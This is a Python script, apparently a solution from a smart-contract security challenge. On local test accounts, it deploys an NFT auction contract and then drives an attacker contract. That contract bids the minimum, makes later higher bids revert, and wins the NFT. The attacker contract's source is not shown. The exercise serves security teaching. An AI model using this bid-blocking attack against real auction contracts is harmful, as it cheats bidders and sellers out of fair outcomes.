from ape import accounts, project
from .utils.helper import w3, time_travel, reverts


def deploy(deployer):

    # deploy Auction contract
    print("\n--- Deploying Auction Contract ---\n")
    auction = project.Auction.deploy(sender=deployer)

    # deploy get NFT contract
    nft_address = auction.nftContract()
    nft = project.MockERC721.at(nft_address)

    return nft, auction


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    minter = accounts.test_accounts[1]
    bidder_1 = accounts.test_accounts[2]
    bidder_2 = accounts.test_accounts[3]
    attacker = accounts.test_accounts[4]

    # get nft and auction contracts
    nft, auction = deploy(deployer)

    # workflow
    token_id = 0

    tx = auction.list(value="1 ether", sender=minter)
    event = [log for log in auction.ListedId.from_receipt(tx)][0]
    assert event["id"] == token_id and event["owner"] == minter.address

    tx = auction.bid(token_id, value="2 ether", sender=bidder_1)
    event = [log for log in auction.BidId.from_receipt(tx)][0]
    assert (
        event["id"] == token_id
        and event["bidder"] == bidder_1.address
        and event["bidAmount"] == w3.to_wei(2, "ether")
    )

    tx = auction.bid(token_id, value="3 ether", sender=bidder_2)
    event = [log for log in auction.BidId.from_receipt(tx)][0]
    assert (
        event["id"] == token_id
        and event["bidder"] == bidder_2.address
        and event["bidAmount"] == w3.to_wei(3, "ether")
    )
    # time travel till 7 days elapse
    time_travel(60 * 60 * 24 * 7)
    tx = auction.collect(token_id, sender=bidder_2)
    event = [log for log in auction.TransferId.from_receipt(tx)][0]
    assert (
        event["id"] == 0
        and event["from"] == minter.address
        and event["to"] == bidder_2.address
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    print("\n-- Attack takes place during auction --\n")
    print("\n-- Minter is listing another NFT --\n")
    token_id = nft.nftId()

    tx = auction.list(value="1 ether", sender=minter)
    event = [log for log in auction.ListedId.from_receipt(tx)][0]
    assert event["id"] == token_id and event["owner"] == minter.address

    print("\n-- Attacker bids the lowest amount --\n")
    attacker_contract = project.AuctionAttacker.deploy(
        auction.address,
        value=w3.to_wei(1, "ether") + 1,
        sender=attacker,
    )
    attacker_contract.start_attack(token_id, sender=attacker)

    print("\n-- Other users will try to bid high amounts --\n")
    with reverts():
        auction.bid(token_id, value="3 ether", sender=bidder_1)
    with reverts():
        auction.bid(token_id, value="4 ether", sender=bidder_2)

    print("\n-- Time traveling so auction can end --\n")
    time_travel(60 * 60 * 24 * 7)

    print("\n-- No other user was able to bid and the attacker can collect now --\n")
    attacker_contract.finish_attack(token_id, sender=attacker)

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- The attacker won the auction by bidding the lowest amount possible ---\n"
    )

    assert nft.ownerOf(token_id) == attacker.address

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
